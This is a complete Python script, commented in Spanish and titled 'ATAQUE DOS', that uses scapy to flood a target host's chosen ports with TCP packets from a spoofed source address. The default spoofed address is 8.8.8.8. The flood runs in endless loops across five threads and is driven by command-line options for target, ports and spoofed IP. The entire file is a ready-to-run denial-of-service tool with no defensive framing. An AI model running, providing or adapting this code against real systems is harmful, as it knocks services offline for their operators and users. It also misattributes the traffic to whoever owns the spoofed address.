#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

                                ATAQUE DOS

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

from scapy.all import *
from optparse import OptionParser
from termcolor import colored
from threading import *	#Librería para hilos
from multiprocessing import Queue #Librería para procesos

target = ''
spoof = '8.8.8.8'

def ddos(port_queue):   #Funcion para realizar ataque DDoS
    num = 1
    try:
        while not port_queue.empty():
             port = port_queue.get()
             while(True):					
                  IP_ataque = IP(src=spoof,dst=target)
                  TCP_ataque = TCP(sport=RandShort(),dport=int(port))	#Se genera un puerto origen aleatorio
                  pkt = IP_ataque/TCP_ataque
                  send(pkt,inter = .001, verbose=False)
                  print(" Paquete numero %d enviado. %s --> %s:%d" %(num, spoof, target, int(port)))
                  num = num + 1
    except Exception as ex:
        print(ex)   #Imprime excepcion que no haga funcionar el programa
    except:
        print(colored(" Error en la conexión", 'red', attrs=['bold', 'blink']))


def main():     #Funcion principal con parseo de argumentos

        global target   #Variables globales
        global spoof

        parser = OptionParser(usage="%prog [-t target] [-p ports] ",
                  version="Distributed Denial-of-Service %prog ")
        parser.add_option("-t", "--target", dest="targets",
                          help="IP del host al que lanzar el ataque", metavar="TARGET")
        parser.add_option("-s", "--spoof", dest="spoof",
                          help="Dirección IP spoofeada", metavar="SPOOF")
        parser.add_option("-p", "--ports", dest="ports",
                          help="Puertos a los que lanzar el ataque. Deben ir separados por comas (5max).", metavar="PORTS")

        (options, args) = parser.parse_args()

        #Si no se introduce target y/o puerto, imprime el help

        if (options.targets == None) | (options.ports == None):
            parser.print_help()
            exit(0)

        if options.spoof:
            spoof = options.spoof

        target = str(options.targets)
        ports = str(options.ports).split(',')
        port_queue = Queue()

        for port in ports:
            port_queue.put(port.strip())

        pool = []
        for thread_id in range(5):  #Creación de hilos para puertos introducidos(5 maximo)
            t = Thread(target=ddos, args=[port_queue])
            pool.append(t)
            t.start()

	# Debido al While True esto no será alcanzado (lo pongo por si se quiere
	# poner un límite al número de paquetes enviados)
        for thread in pool:
            thread.join()

# Programa principal

if __name__ == '__main__':
    main()
